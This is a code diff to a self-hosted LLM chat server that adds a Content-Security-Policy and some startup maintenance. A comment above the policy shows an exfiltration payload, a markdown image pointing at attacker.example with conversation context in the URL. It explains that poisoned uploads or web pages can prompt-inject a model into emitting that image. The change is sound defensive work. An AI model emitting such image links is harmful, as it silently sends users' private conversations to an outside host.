@@ -30,17 +30,58 @@ import { feedsRouter } from './routes/feeds.ts'
 import { sqlite, getAppSetting, setAppSetting } from './lib/db.ts'
 import { runDream } from './lib/memory.ts'
 import { runDueMonitors } from './lib/monitor-runner.ts'
-import { validateConfig, checkEmbeddingDimensions } from './lib/config-check.ts'
+import { validateConfig, checkEmbeddingDimensions, checkAttachmentBudget } from './lib/config-check.ts'
+import { purgeOrphanVectors } from './lib/vector-cleanup.ts'
+import { EMBED_BATCH_CHARS, EMBED_MAX_INPUT_CHARS } from './lib/llm.ts'
 
 import { IMAGE_API, IMAGE_STEPS, IMAGE_STORAGE_DIR } from './lib/image-store.ts'
 
 const app = new Hono<AppEnv>()
 
 app.use('*', logger())
-// No CSP here: the client renders KaTeX, syntax highlighting and a service worker, and an
-// untested policy breaks the page silently. A ready-to-enable policy is in the README's
-// nginx section instead. HSTS is left to the proxy that terminates TLS.
+// HSTS is left to the proxy that terminates TLS.
 app.use('*', secureHeaders({ xFrameOptions: 'DENY', referrerPolicy: 'strict-origin-when-cross-origin', strictTransportSecurity: false }))
+
+/** The directive that matters is `img-src`.
+ *
+ *  An assistant answer containing `![](https://attacker.example/?d=<context>)` is rendered as a
+ *  plain `<img src>` by the markdown renderer, so the browser fetches it the moment the answer
+ *  appears: no tool call, nothing in the progress log, and `url-guard.ts` never involved — that
+ *  guard is server-side and blocks the *inward* direction (SSRF). Restricting images to our own
+ *  origin is the only thing that closes it, and a model can be talked into emitting such an image
+ *  by content it reads (a poisoned upload or web page), not only by being maliciously trained.
+ *
+ *  Applied by the app rather than left to a reverse proxy so it also covers direct-port
+ *  deployments, and so it can be regression-tested. Verified against the built client: the service
+ *  worker registers from an external /registerSW.js (no inline script), KaTeX and
+ *  react-syntax-highlighter need inline *styles* only, and nothing loads from a third-party origin.
+ *  `unsafe-inline` for styles does not reopen the hole — CSS `url()` image loads are governed by
+ *  img-src and @font-face by font-src. Dev is unaffected: Vite serves the page there. */
+const DEFAULT_CSP = [
+  "default-src 'self'",
+  "script-src 'self'",
+  "style-src 'self' 'unsafe-inline'",
+  "img-src 'self' data: blob:",
+  "font-src 'self' data:",
+  "connect-src 'self'",
+  "worker-src 'self'",
+  "object-src 'none'",
+  "base-uri 'self'",
+  "form-action 'self'",
+  "frame-ancestors 'none'",
+].join('; ')
+
+// Full replacement for deployments that legitimately load remote assets. Empty string disables.
+const CSP = process.env.CONTENT_SECURITY_POLICY ?? DEFAULT_CSP
+if (!CSP) {
+  console.warn('[csp] Content-Security-Policy disabled — an answer containing a remote markdown image can silently send conversation content to that host.')
+} else {
+  // Set after next(), matching secureHeaders above: the response object exists by then.
+  app.use('*', async (c, next) => {
+    await next()
+    c.res.headers.set('Content-Security-Policy', CSP)
+  })
+}
 
 // The client is always same-origin (Hono serves it in production, Vite proxies /api in dev),
 // so CORS is off unless a cross-origin caller is explicitly configured.
@@ -95,7 +136,7 @@ const _defaultBase = _baseURL ?? 'http://localhost:11434/api'
 console.log(`  chat:   ${process.env.CHAT_PROVIDER ?? _defaultProvider}  ${process.env.CHAT_BASE_URL ?? _defaultBase}  model=${process.env.CHAT_MODEL ?? 'llama3.2'}`)
 console.log(`  small:  ${process.env.SMALL_PROVIDER ?? process.env.CHAT_PROVIDER ?? _defaultProvider}  ${process.env.SMALL_BASE_URL ?? process.env.CHAT_BASE_URL ?? _defaultBase}  model=${process.env.SMALL_MODEL ?? process.env.CHAT_MODEL ?? 'llama3.2'}`)
 console.log(`  thinking: ${process.env.THINKING_PROVIDER ?? process.env.CHAT_PROVIDER ?? _defaultProvider}  ${process.env.THINKING_BASE_URL ?? process.env.CHAT_BASE_URL ?? _defaultBase}  model=${process.env.THINKING_MODEL ?? process.env.CHAT_MODEL ?? 'llama3.2'}`)
-console.log(`  embed:  ${process.env.EMBED_PROVIDER ?? process.env.CHAT_PROVIDER ?? _defaultProvider}  ${process.env.EMBED_BASE_URL ?? process.env.CHAT_BASE_URL ?? _defaultBase}  model=${process.env.EMBED_MODEL ?? 'nomic-embed-text'}  dims=${process.env.EMBED_DIMENSIONS ?? '1536'}`)
+console.log(`  embed:  ${process.env.EMBED_PROVIDER ?? process.env.CHAT_PROVIDER ?? _defaultProvider}  ${process.env.EMBED_BASE_URL ?? process.env.CHAT_BASE_URL ?? _defaultBase}  model=${process.env.EMBED_MODEL ?? 'nomic-embed-text'}  dims=${process.env.EMBED_DIMENSIONS ?? '1536'}  ctx=${process.env.EMBED_CONTEXT_TOKENS ?? '1024'}tok → ${EMBED_BATCH_CHARS}c/request, ${EMBED_MAX_INPUT_CHARS}c/vector`)
 console.log(`  searxng: ${process.env.SEARXNG_URL ?? 'http://localhost:4000'}`)
 if (process.env.IMAGE_BASE_URL) {
   const imageDir = IMAGE_STORAGE_DIR
@@ -129,9 +170,16 @@ async function preflight() {
   }
 
   await checkEmbeddingDimensions()
+  await checkAttachmentBudget()
 }
 
 validateConfig()
+
+// Vectors whose owning row is gone are invisible in results (every search inner-joins the owner)
+// but are still scanned on every query, and their meta rows keep the original text on disk. Swept
+// here because the deletion paths that used to leak them are fixed, so existing databases carry
+// debris that nothing else would ever remove.
+purgeOrphanVectors()
 
 preflight().catch(() => {})
 
